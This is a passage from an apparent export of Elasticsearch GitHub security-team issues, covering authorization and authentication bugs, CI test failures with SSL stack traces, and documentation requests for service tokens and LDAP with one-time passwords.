In small or medium deployments this security flaw is more theoretical as the breaching probability is low but in large deployments (hundereds of log shippers located on-premise, in clouds, ...) it creates a very serious security issue.

So there should be more granular permissions and checking of each of the connected beats. This has to be done on elasticsearch side. Or on the beats side the solution can be more simple if it could route monitoring data via logstash as a regular shipped logs. Currently in our deployments we use 2 additional fields in beats shippers - machine_group, authkey. On the logstash side we check if the pair is correct. This is very simple and effective, could be also usable if beats would allow to route its monitoring data via logstash.","Pinging @elastic/es-security",no,":Security/Authorization,Team:Security,"
elastic/elasticsearch,635279911,"Unable to invalidate tokens by realm or username for tokens that are created with `client_credentials` grant","When we create an access token via the `client_credentials` grant, we do not generate a refresh token for it ( attempting to be as close as possible to the oAuth2 spec ). However, when invalidating tokens by realm name or username, we [don't take that into consideration](https://github.com/elastic/elasticsearch/blob/7.x/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/TokenService.java#L1543) and always assume that the token document will contain a `refresh_token` field. This leads to a `NPE` and a 500 status code. 



","Pinging @elastic/es-security (:Security/Authentication)",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317449414,"Response from wildcard resolution vs specific index access","*Original comment by @jaymode:*

The current authorization behavior (5.1.1 RC) is a bit different when a user requests values for indices that do not exist or they are not authorized to see. For example, consider the following table:

| Authorized    | Specific Index (exists) | Specific Index (nonexisting) | Wildcard (exists) | Wildcard (nonexisting) |
| ------------- | ---------------------- | --------------------------- | -------------------- | ---------------------- |
| Yes                 | 200                               | 404                                       | 200                           | 200 |
| Yes (no security) | 200 | 404 | 200 | 200 |
| No (no indices permissions)| 403  | 403 | 403 | 403 |
| No (indices permissions) |  403 | 403 | 200 | 200 |

The action used here was a search request and nothing with indices options was modified. The first row is from a user with superuser privileges. The third row user only has cluster privileges and the fourth row user cluster monitor indices privileges to a non-existing index.

Another example is the cat indices API, which uses a mix of cluster and index actions:

| Authorized    | Specific Index (exists) | Specific Index (nonexisting) | Wildcard (exists) | Wildcard (nonexisting) |
| ------------- | ---------------------- | --------------------------- | -------------------- | ---------------------- |
| Yes                 | 200                               | 404                                       | 200                           | 200 |
| Yes (no security) | 200 | 404 | 200 | 200 |
| No (no indices permissions)| 403  | 403 | 403 | 403 |
| No (indices permissions) |  403 | 404 | 200 | 200 |

The one difference is when a specific index is requested but doesn't exist. I think we get the 404 because of the indices options that the API uses (maybe @javanna can confirm).

We should make the third and fourth row behavior consistent. 

The other item I'd like to consider is when a user is not authorized to an index then we would show a 404 regardless of if the index exists or not.

","*Original comment by @javanna:*

As for search, we would rather like to have the third row exactly the same as the fourth one. The reason why it is not the case is that the third user has cluster level permissions, no indices level permission, while the fourth one has some kind of indices level permission. In the latter case, the request has lenient indices options and we let it through to core knowing that it will no yield any result, as it resolves to no indices. In the former case we don't let the request through as the user can't do any indices action at all. This can potentially be worked around I think.

As for cat apis, that is trickier. Cat requests are composed of multiple internal requests, one of which is usually a cluster state request. Cluster state is mapped as a cluster monitor action, although it holds indices that are subject to indices resolution. Shield doesn't check its indices though, it doesn't do any resolving either. Elasticsearch does the resolving though, and may throw unexpected 404. The cat indices api calls cluster state by hardcoding the indices option to strict, hence the 404 when an index doesn't exist. The solution would be to special case or map differently the cluster state request and let shield do the indices resolution rather than core. But that's weird as this is not an indices action.heads up: we should have a look at how much of this is still valid. Behaviour of indices resolution in security has changed quite a bit since https://github.com/elastic/elasticsearch/commit/d27c4bee82c03388730d8ef86d2e4200c8bbf820 . I believe that went out with 6.0. We now honour `allow_no_indices`, so where we previously would throw `404` errors in security, we can now return the same status code that vanilla elasticsearch returns.Before we can make breaking changes like this to the API we need a form of API versioning so that we can gracefully transition clients through a breaking change like this. For this we have #11184 and I consider some functionality like this a prerequisite.",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,870020516,"[CI] Failure in :x-pack:qa:rolling-upgrade:v7.14.0#twoThirdsUpgradedTest on master","**Build scan**:

https://gradle-enterprise.elastic.co/s/5wzpqiepvm2mw

**Repro line**:

No particular test failure

**Reproduces locally?**:

No

**Applicable branches**:

master

**Failure history**:

seen once today

**Failure excerpt**:

Log contains suspicious:
```
[2021-04-28T06:19:56,312][WARN ][o.e.t.TcpTransport       ] [v7.14.0-0] exception caught on transport layer [Netty4TcpChannel{localAddress=0.0.0.0/0.0.0.0:63412, remoteAddress=null, profile=default}], closing connection
»  io.netty.handler.codec.DecoderException: javax.net.ssl.SSLException: No PSK available. Unable to resume.
»  	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:471) ~[netty-codec-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276) ~[netty-codec-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) [netty-transport-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) [netty-common-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) [netty-common-4.1.49.Final.jar:4.1.49.Final]
»  	at java.lang.Thread.run(Thread.java:834) [?:?]
»  Caused by: javax.net.ssl.SSLException: No PSK available. Unable to resume.
»  	at sun.security.ssl.Alert.createSSLException(Alert.java:129) ~[?:?]
»  	at sun.security.ssl.Alert.createSSLException(Alert.java:117) ~[?:?]
»  	at sun.security.ssl.TransportContext.fatal(TransportContext.java:308) ~[?:?]
»  	at sun.security.ssl.TransportContext.fatal(TransportContext.java:264) ~[?:?]
»  	at sun.security.ssl.TransportContext.fatal(TransportContext.java:255) ~[?:?]
»  	at sun.security.ssl.ServerHello$T13ServerHelloConsumer.consume(ServerHello.java:1224) ~[?:?]
»  	at sun.security.ssl.ServerHello$ServerHelloConsumer.onServerHello(ServerHello.java:984) ~[?:?]
»  	at sun.security.ssl.ServerHello$ServerHelloConsumer.consume(ServerHello.java:872) ~[?:?]
»  	at sun.security.ssl.SSLHandshake.consume(SSLHandshake.java:392) ~[?:?]
»  	at sun.security.ssl.HandshakeContext.dispatch(HandshakeContext.java:444) ~[?:?]
»  	at sun.security.ssl.SSLEngineImpl$DelegatedTask$DelegatedAction.run(SSLEngineImpl.java:1065) ~[?:?]
»  	at sun.security.ssl.SSLEngineImpl$DelegatedTask$DelegatedAction.run(SSLEngineImpl.java:1052) ~[?:?]
»  	at java.security.AccessController.doPrivileged(Native Method) ~[?:?]
»  	at sun.security.ssl.SSLEngineImpl$DelegatedTask.run(SSLEngineImpl.java:999) ~[?:?]
»  	at io.netty.handler.ssl.SslHandler.runAllDelegatedTasks(SslHandler.java:1542) ~[netty-handler-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.handler.ssl.SslHandler.runDelegatedTasks(SslHandler.java:1556) ~[netty-handler-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1440) ~[netty-handler-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267) ~[netty-handler-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314) ~[netty-handler-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501) ~[netty-codec-4.1.49.Final.jar:4.1.49.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440) ~[netty-codec-4.1.49.Final.jar:4.1.49.Final]
»  	... 16 more
```

","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-delivery (Team:Delivery)Another similar failure today: https://gradle-enterprise.elastic.co/s/uthp6fzynplk6. Logs are full of stack-traces like the one above. It does not reproduce locally.",no,":Delivery/Build,>test-failure,:Security/Security,Team:Security,Team:Delivery,"
elastic/elasticsearch,332288135,"LDAP authn using SRV for the Server Set","@robgil  Asked whether we plan to support the discovery of LDAP servers using the [SRV DNS records](https://www.ietf.org/rfc/rfc2782.txt). 
UnboundID, the underlying library we use for LDAP comm, allows for [SRV records server sets](https://docs.ldap.com/ldap-sdk/docs/javadoc/com/unboundid/ldap/sdk/DNSSRVRecordServerSet.html) . Therefore, I think it's feasible to have another type for the [LdapLoadBalancing](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/ldap/support/LdapLoadBalancing.java) and support the feature of determining the LDAP server set using SRV DNS entries.","Pinging @elastic/es-security",no,">feature,:Security/Authentication,Team:Security,"
elastic/elasticsearch,828915826,"Put User doesn't always overwrite custom metadata","https://discuss.elastic.co/t/how-to-remove-custom-metadata-fields-from-users-and-roles/266646/2

By design, a PUT on a user does not overwrite their password unless the password (or hash) is in the request body.  
That means, that within the NativeUsersStore, the Put will actually perform an update on the underlying document.

Because `metadata` is stored as a nested object, the semantics of that update means that metadata fields are not always removed from the document, even though they are supposed to be (and are for other object types like roles).

To be extra confusing putting a user with `metadata: {}` will preserve all existing metadata, but not specifying `metadata` at all will remove all metadata (and `metadata: null` is not allowed by the rest parser).

We will need to think carefully about how to fix this without breaking existing workflows that rely on the bug. 

Examples below:
```
GET /.security/_doc/user-test {}
=== 
{
  ""_index"": "".security-7"",
  ""_type"": ""_doc"",
  ""_id"": ""user-test"",
  ""found"": false
}
=== 

PUT /_security/user/test {}
{""roles"":[],""password"":""this is a password"",""metadata"":{""test 1"":1}}
=== 
{  ""created"": true  }
=== 

GET /.security/_doc/user-test {}
=== 
{
  ""_index"": "".security-7"",
  ""_type"": ""_doc"",
  ""_id"": ""user-test"",
  ""_version"": 8,
  ""_seq_no"": 23,
  ""_primary_term"": 2,
  ""found"": true,
  ""_source"": {
    ""username"": ""test"",
    ""password"": ""$2a$10$wDDS11yWheRfK2ypdYnlkOvX5Mbh/h38i9Ig9hE.1QHpUY0RlFeLq"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": {  ""test 1"": 1  },
    ""enabled"": true,
    ""type"": ""user""
  }
}
=== 

GET /_security/user/test {}
=== 
{
  ""test"": {
    ""username"": ""test"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": { ""test 1"": 1  },
    ""enabled"": true
  }
}
=== 

PUT /_security/user/test {}
{""roles"":[],""metadata"":{""test 2"":2}}
=== 
{  ""created"": false }
=== 

GET /.security/_doc/user-test {}
=== 
{
  ""_index"": "".security-7"",
  ""_type"": ""_doc"",
  ""_id"": ""user-test"",
  ""_version"": 9,
  ""_seq_no"": 24,
  ""_primary_term"": 2,
  ""found"": true,
  ""_source"": {
    ""username"": ""test"",
    ""password"": ""$2a$10$wDDS11yWheRfK2ypdYnlkOvX5Mbh/h38i9Ig9hE.1QHpUY0RlFeLq"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": {
      ""test 1"": 1,
      ""test 2"": 2
    },
    ""enabled"": true,
    ""type"": ""user""
  }
}
=== 

GET /_security/user/test {}
=== 
{
  ""test"": {
    ""username"": ""test"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": {
      ""test 2"": 2,
      ""test 1"": 1
    },
    ""enabled"": true
  }
}
=== 

PUT /_security/user/test {}
{""roles"":[],""metadata"":{}}
=== 
{  ""created"": false }
=== 

GET /.security/_doc/user-test {}
=== 
{
  ""_index"": "".security-7"",
  ""_type"": ""_doc"",
  ""_id"": ""user-test"",
  ""_version"": 9,
  ""_seq_no"": 24,
  ""_primary_term"": 2,
  ""found"": true,
  ""_source"": {
    ""username"": ""test"",
    ""password"": ""$2a$10$wDDS11yWheRfK2ypdYnlkOvX5Mbh/h38i9Ig9hE.1QHpUY0RlFeLq"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": {
      ""test 1"": 1,
      ""test 2"": 2
    },
    ""enabled"": true,
    ""type"": ""user""
  }
}
=== 

GET /_security/user/test {}
=== 
{
  ""test"": {
    ""username"": ""test"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": {
      ""test 2"": 2,
      ""test 1"": 1
    },
    ""enabled"": true
  }
}
=== 

PUT /_security/user/test {}
{""roles"":[]}
=== 
{  ""created"": false }
=== 

GET /.security/_doc/user-test {}
=== 
{
  ""_index"": "".security-7"",
  ""_type"": ""_doc"",
  ""_id"": ""user-test"",
  ""_version"": 10,
  ""_seq_no"": 25,
  ""_primary_term"": 2,
  ""found"": true,
  ""_source"": {
    ""username"": ""test"",
    ""password"": ""$2a$10$wDDS11yWheRfK2ypdYnlkOvX5Mbh/h38i9Ig9hE.1QHpUY0RlFeLq"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": null,
    ""enabled"": true,
    ""type"": ""user""
  }
}

=== 
GET /_security/user/test {}
=== 
{
  ""test"": {
    ""username"": ""test"",
    ""roles"": [],
    ""full_name"": null,
    ""email"": null,
    ""metadata"": {},
    ""enabled"": true
  }
}
```","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317450089,"Inconsistent x-pack license behavior","*Original comment by @joshbressers:*

If I have X-Pack installed on a system bound to localhost and try to install a platinum license I get this error:

{""error"":{""root_cause"":[{""type"":""illegal_state_exception"",""reason"":""Can not upgrade to a production license unless TLS is configured or security is disabled""}],""type"":""illegal_state_exception"",""reason"":""Can not upgrade to a production license unless TLS is configured or security is disabled""},""status"":500}

I can disable security
xpack.security.enabled: false
restart the server then apply the license. If I then enable security, everything runs fine (there is a warning in the log).

I would expect us to have a consistent experience here.

Either we allow a license to be applied when bound to localhost (I would prefer this one)
Or we don't start if there is a platinum license, security enabled, and no TLS.",,no,">enhancement,:Security/Security,:Security/License,Team:Security,"
elastic/elasticsearch,317446949,"remove reliance on exceptions to indicate authentication required","*Original comment by @jaymode:*

When thinking about custom realms, we differ from many common frameworks in that we use a specialized exception to indicate a request needs authentication or to issue redirects to external services.  

We should consider other mechanisms to provide this functionality. One idea is to allow realms/authentication service to send a response to the channel. Additionally, a new status could be added to indicate if authentication was a failure, success, or is ongoing.

This comes into play when thinking about a GSSAPI scenario, where multiple rounds of communication can occur in the authentication and this could create lots of clutter in the audit logs.


","*Original comment by @javanna:*

Relates to LINK REDACTED We want to stop returning exceptions headers as response headers (they are already printed out as part of the response body anyways). But we can only do it for now for `es.` headers, as exception headers are needed in security for e.g. `WWW-Authenticate`. Once we can return these response headers without using exception headers, we can completely remove returning them as response headers.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317455060,"setup-passwords exit code always 0","*Original comment by @Mpdreamz:*

`setup-passwords` always exits with exit code `0`, atleast on windows.

> PS C:\Program Files\Elastic\Elasticsearch\bin\x-pack> .\setup-passwords interactive
Initiating the setup of reserved user [elastic, kibana, logstash_system]  passwords.
You will be prompted to enter passwords as the process progresses.
> Please confirm that you would like to continue [y/N]y


> Enter password for [elastic]:
Reenter password for [elastic]:
Exception making http rest request for user [elastic]
Exception in thread ""main"" java.io.IOException: {""error"":{""root_cause"":[{""type"":""security_exception"",
 authenticate user [elastic]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\
ity_exception"",""reason"":""failed to authenticate user [elastic]"",""header"":{""WWW-Authenticate"":""Basic r
harset=\""UTF-8\""""}},""status"":401}
        at org.elasticsearch.xpack.security.authc.esnative.tool.CommandLineHttpClient.postURL(Command
:116)
        at org.elasticsearch.xpack.security.authc.esnative.tool.SetupPasswordTool$SetupCommand.change
ordTool.java:249)
        at org.elasticsearch.xpack.security.authc.esnative.tool.SetupPasswordTool$SetupCommand.change
wordTool.java:237)
        at org.elasticsearch.xpack.security.authc.esnative.tool.SetupPasswordTool$InteractiveSetup.ex
Tool.java:166)
        at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:69)
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134)
        at org.elasticsearch.cli.MultiCommand.execute(MultiCommand.java:69)
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134)
        at org.elasticsearch.cli.Command.main(Command.java:90)
        at org.elasticsearch.xpack.security.authc.esnative.tool.SetupPasswordTool.main(SetupPasswordT
Caused by: java.io.IOException: Server returned HTTP response code: 401 for URL: http://127.0.0.1:920
ser/elastic/_password
        at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(Unknown Source)
        at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
        at org.elasticsearch.xpack.security.authc.esnative.tool.CommandLineHttpClient.postURL(Command
:110)
        ... 9 more
PS C:\Program Files\Elastic\Elasticsearch\bin\x-pack> $lastexitcode
0","*Original comment by @tvernum:*

This seems to do the right thing on unix, and I don't have the batch file skillz to know what we need to do to make it work correctly on Windows (it seems to do the same thing as all our other batch files)

@Mpdreamz Can you, or one of the MS team give any pointers about what we should be doing in batch file to propagate the exit code up from the Java process?
*Original comment by @Mpdreamz:*

Will add a PR today, sorry @tvernum meant to from the get go but had to take PTO. *Original comment by @jaymode:*

@Mpdreamz are you still planning on a PR?Hello,  I believe I have found this bug.  But can not reproduce the error.   Can you add some color on how you can reproduce this error?This seems to have been fixed. I am using elasticsearch 7.4.",no,">bug,help wanted,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1123681269,"Clarify the intended usage of service-tokens CLI","The documentation around [Service Accounts](https://www.elastic.co/guide/en/elasticsearch/reference/current/service-accounts.html) needs more clarification on how and when to use the [elasticsearch-service-tokens CLI](https://www.elastic.co/guide/en/elasticsearch/reference/current/service-tokens-command.html). 

Currently, it is not clear that the CLI generates token on the single node where the it runs. It also generates different token each time it runs. As such, the CLI is more suitable to be part of an orchestration flow. That is, using it to prepare a service token that can be used on all nodes in a cluster needs roughly the following steps:

1. Run the CLI to generate the service token on one node.
2. Copy the `service_tokens` file generated in the previous step to all other nodes of the cluster.

Alternatively, the [CreateServiceToken API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-create-service-token.html) can be used to generate a service token that is automatically usable on all nodes (similar to how [CreateUser API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-put-user.html) works).","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)Thanks for clarifying! The API route works successfully!",no,">docs,:Security/Security,Team:Security,"
elastic/elasticsearch,1038084013,"[CI] LdapSessionFactoryTests testSslTrustIsReloaded failing","Probably due to LDAP SDK upgrade

**Build scan:**
https://gradle-enterprise.elastic.co/s/mcvldz7n6rf7c/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests/testSslTrustIsReloaded

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests.testSslTrustIsReloaded"" -Dtests.seed=98D16D40F593AD3C -Dtests.locale=ar-JO -Dtests.timezone=SST -Druntime.java=17`

**Applicable branches:**
8.0

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests&tests.test=testSslTrustIsReloaded

**Failure excerpt:**
```
java.lang.AssertionError: 
Expected: a throwable with message of (a string containing ""PKIX path validation failed"" or a string containing ""peer not authenticated"")
     but: was <javax.net.ssl.SSLHandshakeException: Remote host terminated the handshake> at java.base/sun.security.ssl.SSLSocketImpl.handleEOF(SSLSocketImpl.java:1709)

  at __randomizedtesting.SeedInfo.seed([98D16D40F593AD3C:A79C8830889F5BBB]:0)
  at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
  at org.junit.Assert.assertThat(Assert.java:956)
  at org.junit.Assert.assertThat(Assert.java:923)
  at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests.testSslTrustIsReloaded(LdapSessionFactoryTests.java:346)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:78)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
  at java.lang.Thread.run(Thread.java:831)

```","Pinging @elastic/es-security (Team:Security)Haven't seen any recurrence and cannot reproduce. Closing for now.This has hit again: https://gradle-enterprise.elastic.co/s/lzsavg2452shu",no,">test-failure,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1176709320,"Clarify `cloud-saml-*` realms in upgrade assistant errors/warnings","Upgrading from 7.17 to 8.1 is resulting in the following pre-upgrade error:

<img width=""389"" alt=""image"" src=""https://user-images.githubusercontent.com/7216393/158224654-4c935591-dae3-487e-bfc1-c7318b4f1f09.png"">

The above links to https://www.elastic.co/guide/en/elasticsearch/reference/7.16/breaking-changes-7.7.html#deprecate-duplicated-realm-orders.

For those familiar with the inner workings of Elastic Cloud, they will know that the above error is indicating a conflict between one of our hidden/system auth realm definition on Elastic Cloud (`cloud-saml-kibana`) and one of the custom defined auth realms.  For users who are not aware of the hidden `cloud-saml-*` realms, they may wonder why they are getting such error because they didn't provision these other realms themselves in their Edit deployment screen.  It can be more user friendly to simply add a note in the error to indicate that `cloud-saml-*` are ""system"" realms defined internally by Elastic Cloud and the order number for these realms cannot be changed so they will have to change their custom realm's order value.","Pinging @elastic/kibana-security (Team:Security)Hey @ppf2 -- I'm going to transfer this to the `elasticsearch` repository, as this message is managed entirely by Elasticsearch.",no,"Team:Security,Feature:Upgrade Assistant,"
elastic/elasticsearch,1004914741,"[DOCS] Document how to use LDAP with OTP/MFA","It's becoming more and more common for people to integrate One Time Passwords into their LDAP directory.
Typically this requires prepending/appending the OTP onto the users password as part of a regular LDAP `bind` operation.

When using Elasticsearch's LDAP Realm with Basic Authentication, this scheme will fail because ES may (typically _will_) make multiple bind attempts using the same user password. This is necessary because ES does not have a concept of a ""session"" and there is no ""login step"" - we authenticate every single request. We [keep an in memory cache](https://www.elastic.co/guide/en/elasticsearch/reference/7.15/controlling-user-cache.html#controlling-user-cache) to limit the load we put on the LDAP directory, but we make no commitments about the exact number of times we will attempt to bind to the directory. If incorrect to assume that a user's password will only be authenticated once.

To support OTP with LDAP in the stack you need to use [token based authentication](https://www.elastic.co/guide/en/elasticsearch/reference/7.15/token-authentication-services.html) (or OAuth tokens or API keys).

For Elasticsearch:
- Use the LDAP username + password to get an OAuth token for the user, or to create a new API Key

For Kibana:
- Configure Kibana to use [token authentication](https://www.elastic.co/guide/en/kibana/7.15/kibana-authentication.html#token-authentication)","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",no,">docs,:Security/Authentication,Team:Security,"
elastic/elasticsearch,412871928,"Has Privileges with action names","When defining privileges, inside a role definition, one has the option to specify action names instead of the canonical privilege name. For example, for index privileges, one can specify `indices:admin/delete` instead of `delete_index`, or similarly, `indices:admin/create` instead of `create_index`. In the **authorization scope** they are equivalent. This option, however, exists as an alternative to offer more granular privileges than the named privileges do. For example, one can grant `indices:admin/refresh` instead of the `manage` privilege. The situation is similar in tthe case of cluster privileges.

Nonetheless, granting privileges by action name actually grants more privileges then simply running that named action. This is because an action _could_ be split into sub-actions, for each node, or for each shard of an index or for the replicas of the primary shard. Given the way the authorization framework works, these sub-actions are authorized individually. So, as a convenience to the administrator defining roles with action names as privileges, the actual action name pattern for authorized actions covers these sub-actions as well. But, when we define the named privileges we have the knowledge of whether the actions granted by the privilege actually have sub-actions or not, and we will not authorize sub-actions for actions that we know don't have any. Therefore, because we're forced to pick the general approach when one defines privileges by action names, it _might_ grant **more** privileges (sub-actions included) than if the canonical privilege would have been specified instead. In the **authorization scope** this is not apparent to the user.

However, this becomes apparent in the _has privileges_ scope . When a Role is using canonical privileges in its definition, but the has privilege request contains the action names. The role will not authorize sub-actions (because the actions don't have any) but the has privilege call will interpret the action name in the general way, assuming the user wants to check authorization for the action as well as sub-actions.

Upon reflection I labeled this as a bug, and the solution, I think, should be to have a unified set of actions that have sub-actions and act accordingly when building the automatons for the _has privilege_ or _authorization_ scopes.","Pinging @elastic/es-security",no,">bug,:Security/Authorization,Team:Security,"
